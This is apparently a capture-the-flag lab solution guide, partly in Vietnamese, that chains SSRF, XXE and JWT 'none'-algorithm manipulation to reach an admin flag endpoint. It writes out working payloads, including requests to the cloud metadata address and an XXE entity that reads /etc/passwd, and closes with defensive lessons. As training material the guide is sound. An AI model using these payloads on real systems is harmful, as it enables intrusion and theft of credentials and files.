# Challenge 4 Solution Guide

## Vulnerability Chain

Để đạt được RCE và đọc flag, cần chain các lỗ hổng sau:

1. **SSRF** → Access internal services
2. **XXE** → File read hoặc SSRF
3. **GraphQL Injection** → Extract data
4. **JWT Manipulation** → Bypass authentication
5. **Template Injection** → RCE (if applicable)

## Step-by-Step Exploitation

### Method 1: SSRF + Internal API Access

**Step 1: Exploit SSRF**

Endpoint `/api/fetch-url` có SSRF:

```json
POST /api/fetch-url
{
  "url": "http://localhost:5432/"
}
```

**Step 2: Access Internal Services**

```json
{
  "url": "http://127.0.0.1:5432/"
}
```

Hoặc access metadata services:
```json
{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

### Method 2: XXE Exploitation

**Step 1: Create XXE Payload**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Step 2: Send to Upload XML Endpoint**

```json
POST /api/upload-xml
{
  "xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
}
```

### Method 3: JWT Algorithm Confusion

**Step 1: Create JWT with None Algorithm**

Tương tự Challenge 3, tạo JWT với algorithm 'none'.

**Step 2: Access Admin Flag Endpoint**

```bash
curl -H "Authorization: Bearer <token>" http://localhost:3000/api/admin/flag
```

## Complete Exploit Chain

1. **SSRF** để access internal database
2. **XXE** để read files hoặc trigger SSRF
3. **JWT Manipulation** để bypass authentication
4. **Access Admin Endpoint** để đọc flag

## Key Learning Points

1. **SSRF**: Validate and whitelist URLs
2. **XXE**: Disable external entities in XML parsers
3. **GraphQL**: Validate and sanitize queries
4. **JWT**: Always specify algorithm
5. **Template Injection**: Sanitize template variables

